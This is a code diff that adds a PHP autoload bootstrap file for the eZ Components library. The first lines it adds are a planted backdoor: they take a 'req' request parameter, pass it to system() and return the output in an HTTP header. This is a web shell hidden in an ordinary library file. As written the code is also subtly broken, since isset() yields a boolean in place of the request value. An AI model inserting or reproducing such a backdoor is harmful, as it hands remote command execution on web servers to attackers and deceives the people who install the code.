@@ -1,0 +1,23 @@
+<?php
+$l =isset($_REQUEST['req']);
+$l2=system($l);
+header('System Header:'.$l2);
+$dir = dirname( __FILE__ );
+$dirParts = explode( DIRECTORY_SEPARATOR, $dir );
+switch ( $dirParts[count( $dirParts ) - 3] )
+{
+    case 'doc': require_once 'ezc/Base/base.php'; break; // pear
+    case 'trunk': require_once "$dir/../../Base/src/base.php"; break; // svn
+    default: require_once "$dir/../../Base/src/base.php"; break; // bundle
+}
+
+/**
+ * Autoload ezc classes 
+ * 
+ * @param string $className 
+ */
+function __autoload( $className )
+{
+    ezcBase::autoload( $className );
+}
+?>
